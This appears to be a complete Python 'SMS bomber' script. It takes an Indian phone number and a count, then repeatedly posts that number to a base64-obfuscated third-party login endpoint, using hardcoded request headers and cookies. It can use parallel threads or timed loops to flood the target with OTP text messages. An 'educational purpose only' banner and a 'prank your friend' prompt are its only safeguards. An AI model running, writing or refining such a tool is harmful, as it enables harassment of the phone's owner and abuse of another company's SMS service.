import requests
import time
import base64
import sys
import threading

clear = '\033[0m'
bold = '\033[01m'
red = '\033[31m'
lgreen = '\033[92m'

print("""
    ⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⢀⡴⠚⠉⠉⠀⠀⠀⠉⠙⠓⢦⡀⠀⠀⠀⠀⠀⠀
    ⠀⣰⠋⠀⣀⣠⣤⣤⣤⡄⠀⣤⠤⠤⢿⣦⠀⠀⠀⠀⠀
    ⢰⠇⠀⠰⡅⠀⠰⢆⡼⠀⠀⠳⢤⡼⠟⠈⣧⠀⠀⠀⠀
    ⣼⠀⠀⠀⢉⣉⣉⣩⣤⠤⠤⠤⠶⢶⠒⠀⢸⡄⠀⠀⠀
    ⣿⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⢀⠀⣸⠀⢀⡼⠀⠀⢰⠀
    ⠘⢷⣀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡴⢃⡴⠋⠀⠀⣰⢉⠇
    ⠀⠀⠉⣳⠦⢤⣤⣤⣤⠤⣮⠶⢻⡏⡀⢤⣲⠝⠚⠁⠀
    ⠀⠀⣰⠃⢠⠴⣚⡭⠖⠉⠀⠀⢸⡧⠚⠉⠀⠀⠀⠀⠀
    ⠀⢠⡏⠀⠐⠋⠁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⣾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀
    ⠰⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀
      ⠀""")

print (lgreen+bold+"     <===[[ coded by Mr. Mad Bhai ]]===> "+clear)
print (red+bold+"<===[( This Tool is For Educational Purpose Only. )]===> \n"+clear)

fuck = "aHR0cHM6Ly9iZWF0b2FwcC5jb20vbG9naW4="

# Decrypt the API URL
def decrypt_url(fuck):
    return base64.b64decode(fuck).decode('utf-8')

# Function to validate phone number
def is_valid_phone_number(number):
    if len(number) != 10 or not number.isdigit():
        return False
    if number[0] not in ('6', '7', '8', '9'):
        return False
    return True

# Get user input
phone_number = input("Enter phone number without +91: ")
if not is_valid_phone_number(phone_number):
    print("Invalid phone number.")
    exit()

def get_repeat_count():
    while True:
        try:
            repeat_count = input("SMS Count: ").strip()
            if not repeat_count:
                print("hahaha what an idiot write something you idiot")
                continue
            
            repeat_count = int(repeat_count)
            if repeat_count <= 0:
                print("Aaah write positive value")
            else:
                return repeat_count
        except ValueError:
            print("Invalid input.")

repeat_count = get_repeat_count()

parallel = input("Do you want to send sms bomb in parallel? (y/n): ").strip().lower()

if parallel == 'y':
    # Confirmation before starting the requests
    confirmation = input(f"You are using this tool only to prank your friend not to harm anyone?\n (y/n): ").strip().lower()
    if confirmation != 'y':
        print("cancelled.")
        exit()

    # Headers for the request
    headers = {
        "Cookie": "_gcl_au=1.1.151709731.1721711877; _ga_G653YB2NW3=GS1.1.1721711877.1.0.1721711877.60.0.0; _ga=GA1.1.2140724726.1721711877; _fbp=fb.1.1721711878939.113486923575188492",
        "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lang%22%2C%22eng%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Flogin%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%5D",
        "Accept-Language": "en-US",
        "Sec-Ch-Ua-Mobile": "?0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNt8uFG6lYjxrpypu",
        "Accept": "text/x-component",
        "Next-Action": "6829f5bc94984253e680f321cb02cce5ff97fbd8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i"
    }

    data = (
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu\r\n"
        "Content-Disposition: form-data; name=\"1_phone\"\r\n\r\n"
        f"{phone_number}\r\n"
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu\r\n"
        "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
        "[\"$undefined\",\"$K1\"]\r\n"
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu--"
    )

    # URL
    url = decrypt_url(fuck)

    # Function to send a request
    def send_request():
        response = requests.post(url, headers=headers, data=data)
        if response.status_code != 200:
            print("\nFailed")

    # Start threads for parallel requests
    threads = []
    for i in range(repeat_count):
        t = threading.Thread(target=send_request)
        t.start()
        threads.append(t)

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print(f"All {repeat_count} sms bomb sent in parallelly.")

else:
    delay = int(input("Delay between sms bomb (in sec): "))

    if delay <= 0:
        print("fuck! you idiot, I'm going with my default value (1 sec)")
        delay = 1

    # Confirmation before starting the requests
    confirmation = input(f"You are using this tool only to prank your friend not to harm anyone?\n (y/n): ").strip().lower()
    if confirmation != 'y':
        print("cancelled.")
        exit()

    # Headers for the request
    headers = {
        "Cookie": "_gcl_au=1.1.151709731.1721711877; _ga_G653YB2NW3=GS1.1.1721711877.1.0.1721711877.60.0.0; _ga=GA1.1.2140724726.1721711877; _fbp=fb.1.1721711878939.113486923575188492",
        "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%5B%22lang%22%2C%22eng%22%2C%22d%22%5D%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Flogin%22%2C%22refresh%22%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%5D",
        "Accept-Language": "en-US",
        "Sec-Ch-Ua-Mobile": "?0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNt8uFG6lYjxrpypu",
        "Accept": "text/x-component",
        "Next-Action": "6829f5bc94984253e680f321cb02cce5ff97fbd8",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=1, i"
    }

    data = (
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu\r\n"
        "Content-Disposition: form-data; name=\"1_phone\"\r\n\r\n"
        f"{phone_number}\r\n"
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu\r\n"
        "Content-Disposition: form-data; name=\"0\"\r\n\r\n"
        "[\"$undefined\",\"$K1\"]\r\n"
        "------WebKitFormBoundaryNt8uFG6lYjxrpypu--"
    )

    # URL
    url = decrypt_url(fuck)

    # Send the requests sequentially
    for i in range(repeat_count):
        response = requests.post(url, headers=headers, data=data)
        sys.stdout.write(f"\rDone {i + 1}/{repeat_count}")
        sys.stdout.flush()
        if response.status_code != 200:
            print("\nFailed")
        time.sleep(delay)
    
print("""
( ͡° ͜ʖ ͡°) "ᶠᶸᶜᵏᵧₒᵤ!"
      """)
print(f"fuck! it's done.")